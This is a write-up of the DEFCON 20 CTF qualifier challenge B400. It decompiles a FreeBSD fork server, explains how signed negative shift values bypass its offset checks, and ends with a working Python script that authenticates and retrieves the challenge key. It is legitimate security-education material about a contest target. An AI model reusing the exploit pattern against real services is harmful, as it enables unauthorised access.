@@ -1,0 +1,279 @@
+DEFCON 20 CTF Quals B400 writeup
+
+"No takebacks! Running on 140.197.217.239:11553"
+
+$ file bin400-b5033d3f7205b1996d220df61bf0f25a
+bin400-b5033d3f7205b1996d220df61bf0f25a: ELF 64-bit LSB executable, x86-64,
+version 1 (FreeBSD), dynamically linked (uses shared libs), for FreeBSD 9.0
+(900044), stripped
+
+Analyzing the binary in IDA, we see that it's a fork server like most of
+the other binaries running on DDTEK's servers. The general structure is the
+same: bind and listen on port 11553, fork on accept() and call the client
+handler callback (4017F0).
+
+Below is the hand decompiled client handler callback:
+
+/* http://x-n2o.com/bin400-dc20_decomp.c */
+/* http://x-n2o.com/bin400-dc20          */
+
+int send_full(int fd, char *buf, size_t n); /* @ 401370 */
+int recv_full(int fd, char *buf, size_t n); /* @ 401470 */
+int client_cb(int fd);                      /* @ 4017F0 */
+
+int client_cb(int fd)
+{
+	uint *a;
+	int auth;
+	
+	/* client authentication sequence 1 */
+	a = malloc(sizeof(uint));
+	if(a == NULL)
+		exit(0);
+	recv_full(fd, a, sizeof(uint));
+	auth = little_endian(*a);
+	free(a);
+	if(auth != 0x53794550)
+		return 0;
+	
+	/* client authentication sequence 2 */
+	a = malloc(sizeof(uint));
+	if(a == NULL)
+		exit(0);
+	recv_full(fd, a, sizeof(uint));
+	auth = little_endian(*a);
+	free(a);
+	if(auth != 0x4a75402c)
+		return 0;
+	
+	/* client authentication sequence 3 */
+	a = malloc(sizeof(uint));
+	if(a == NULL)
+		exit(0);
+	recv_full(fd, a, sizeof(uint));
+	auth = little_endian(*a);
+	free(a);
+	if(auth != 0x03818a37)
+		return 0;
+	
+	/* client authentication sequence 4 */
+	a = malloc(sizeof(uint));
+	if(a == NULL)
+		exit(0);
+	recv_full(fd, a, sizeof(uint));
+	auth = little_endian(*a);
+	free(a);
+	if(auth != 0xacf7bc51)
+		return 0;
+	
+	/* generation loop count */
+	int count;
+	
+	a = malloc(sizeof(uint));
+	if(a == NULL)
+		exit(0);
+	recv_full(fd, a, sizeof(uint));
+	count = little_endian(*a);
+	free(a);
+	if(count == 0)
+		return -2;
+	
+	/* word generation loop - most important */
+	int last_shift, shift;
+	u64 gen;
+	int i;
+	
+	last_shift = 0;
+	gen = 0;
+	for(i = 0; i != count; i++) {
+		a = malloc(sizeof(uint));
+		if(a == NULL)
+			exit(0);
+		recv_full(fd, a, sizeof(uint));
+		shift = little_endian(*a);
+		free(a);
+		
+		if(shift > 63)
+			return -1;
+		
+		if(last != -1) {
+			int valid;
+			
+			switch(shift - last_shift)
+			{
+				case -17: valid = last_shift % 8  > 0; break;
+				case -15: valid = last_shift % 8 <= 6; break;
+				case -10: valid = last_shift % 8  > 1; break; 
+				case -6:  valid = last_shift % 8 <= 5; break;
+				case +6:  valid = last_shift % 8  > 1; break;
+				case +10: valid = last_shift % 8 <= 5; break;
+				case +15: valid = last_shift % 8  > 0; break;
+				case +17: valid = last_shift % 8 <= 6; break;
+				default: return -1;
+			}
+			
+			if(!valid)
+				return -1;
+		}
+		
+		gen ^= 1 << shift;
+		last_shift = shift;
+	}
+	
+	for(i = 0; gen != 0; i++)
+		gen &= gen - 1;
+	
+	if(i != 64)
+		return -2;
+	
+	/* read and send key to client */
+	FILE *fp;
+	char *key;
+	long klen;
+	
+	fp = fopen("key", "r");
+	if(fp == NULL)
+		return 0;
+	fseek(fp, 0, SEEK_END);
+	klen = ftell(fp);
+	rewind(fp);
+	k = calloc(1, klen);
+	if(fread(k, 1, klen, fp) != klen)
+		return 0;
+	fclose(fp);
+	send_full(fd, key, klen);
+	
+	return 0;
+}
+
+
+Our objective is to reach the final part of the subroutine, and have the
+key sent to us.  The final check requires the loop below to be executed 64
+times.
+
+for(i = 0; gen != 0; i++)
+	gen &= gen - 1;
+
+We observe that for different values of gen, the number of times the loop
+will have executed is equal to the number of set bits in gen.  It only
+makes sense that for the loop to execute 64 times all bits must be set,
+since it's a qword (64-bits) :)
+(For various interpretations of similar bit twiddling hacks, see [1], [2])
+
+The core of the problem now becomes setting all bits of the qword. This
+brings us to the main loop of the subroutine - the qword generation loop.
+Every iteration of this loop flips a certain bit in the qword:
+
+gen ^= 1 << shift;
+
+The value of shift (bit position to be flipped) is controlled by us. The
+loop starts with the qword having all bits cleared, so as long as we flip
+each bit once, we will obtain our desired qword with all bits set.  The
+pitfall here is that we can select only the first bit position arbitrarily.
+The subsequent bit positions will have to be a certain offset from the last
+one sent. As we see in the switch statement, the allowed offsets are -17,
+-15, -10, -6, +6, +10, +15, +17. Moreover every offset has a set of allowed
+values of the last shift modulo 8 (a whitelist, if you will :).
+
+At this point our problem has turned into a very difficult graph theory
+problem (if we consider every bit as a node in a graph). I tried to come up
+with an algorithm to traverse all the nodes, but it was quite difficult and
+after a few hours I was baffled and decided to try to find an alternate
+solution. Changing the offsets is impossible, but perhaps one could bypass
+the second restriction (last_shift % 8) and pick offsets as one sees fit.
+
+It turns out that you can completely bypass this restriction for certain
+offsets and use any combination of them as desired. The key here is that
+the shift value is signed. It is possible for us to send a negative shift
+value since no checks are made against it. This means that the remainder
+(last_shift % 8) can be made negative. This can bypass the second
+restriction checks for the following offsets in the switch statement:
+
+case -15: valid = last_shift % 8 <= 6; break;
+case -6:  valid = last_shift % 8 <= 5; break;
+case +10: valid = last_shift % 8 <= 5; break;
+case +17: valid = last_shift % 8 <= 6; break;
+
+We can use any combination of these offsets for as long as the shift
+remains negative.  There are many offset sequences one can come up with
+that will lead to our objective. One such sequence can be obtained by using
+solely offset -15 or offset +17. These are indeed the most efficient
+sequences since they are the smallest. We only have to send 63 (either all
+-15 or all +17) offsets plus the initial shift value, which lead to 64 bit
+flips in total.  How can we be sure that a different bit will be flipped
+each time?  As it turns out, both -15 and +17 are additive generators
+modulo 64, because they are both relatively prime to 64 (gcd(-15, 64) = 1
+and gcd(+17, 64) = 1).  This means that after n * (-15) or n * (+17)
+additions of (-15) or (+17) we will have generated all numbers in [0 ..
+63].  Since shifts are analogous to additions and numbers [0 .. 63] to bit
+positions, and since shifts in x86_64 work in a modular fashion, we can use
+this property to our advantage.
+
+The number n is 64, which we observe in the following congruences:
+
+x - 15 * n = x (mod 64)
+x + 17 * n = x (mod 64)
+
+where x is the starting number. Since we already stated that -15 and +17
+are relatively prime, n can only be 64. In reality we only need 63 shifts
+with this offset, since the starting bit is preset. This makes the loop
+count 63 + 1 = 64
+
+There are two slight restrictions to the initial shift, if our selected
+sequence is to leave the last shift always negative. We define the 'safe'
+range of the initial number for offset -15 as [-2^31 + 15 * 63 .. -1], and
+for offset +17 as [-2^31 .. -1 - 17 * 63].
+
+As you can see, received data is treated as big endian, hence the need for
+conversion to little endian.  1. 4 hardcoded authentication dwords 2. loop
+count dword 3. 63 consecutive shift dwords with the selected offset applied
+(either all -15 or all +17)
+
+Working pwnie:
+
+#!/usr/bin/env python
+
+# http://x-n2o.com/bin400-dc20_pwn.py
+# http://x-n2o.com/bin400-dc20
+
+import socket
+import struct
+
+# HOST = "140.197.217.239"
+HOST = "localhost"
+PORT = 11553
+
+def dword(a):
+	return struct.pack(">I", a) # big-endian
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+# auth dwords
+s.send(dword(0x53794550))
+s.send(dword(0x4A75402C))
+s.send(dword(0x03818A37))
+s.send(dword(0xACF7BC51))
+
+# loop count
+s.send(dword(64))
+
+# initial shift
+shift = -65536
+s.send(dword(shift))
+
+# shifts with offset +17 applied
+for i in range(0, 63):
+	shift += 17
+	s.send(dword(shift))
+
+print s.recv(8192)
+
+s.close()
+
+~ X-N2O
+
+[1] Bit Twiddling Hacks - http://graphics.stanford.edu/~seander/bithacks.html
+[2] Hacker's Delight    - http://hackersdelight.org/
+
+http://x-n2o.com/b400-dc20
